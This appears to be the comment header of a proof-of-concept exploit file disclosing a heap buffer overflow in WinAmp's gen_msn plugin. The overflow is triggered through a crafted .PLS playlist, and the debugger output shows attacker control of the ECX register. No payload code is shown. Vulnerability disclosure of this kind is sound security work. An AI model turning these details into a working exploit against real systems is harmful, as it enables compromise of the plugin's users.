# WinAmp GEN_MSN Plugin Heap Buffer Overflow
# ------------------------------------
# Discovered by SkD (skdrat@hotmail.com) &
#		    (skd@abysssec.com)
# ------------------------------------
#
# I'm not much for posting PoCs because
# I like writing exploits for whatever
# I discover and if I don't, its a waste.
#
# Anyway, this buffer overflow is located
# in the gen_msn plugin, which
# is basically a plugin that shows what
# song you're currently listening to
# on your PM in MSN. The plugin has over
# 800,000 downloads so its serious..
# (http://www.winamp.com/plugins/details/144799)
# This is similar to my other recent exploit
# for VUPlayer because it uses the same point
# of the .PLS playlist file!
#
# Debug Info:
# MOV EDI,DWORD PTR DS:[ECX+EAX*4+960]
# Regs:
# EAX 00000003
# ECX 41414141   <- Clear control over the register
# EDX 007EA478
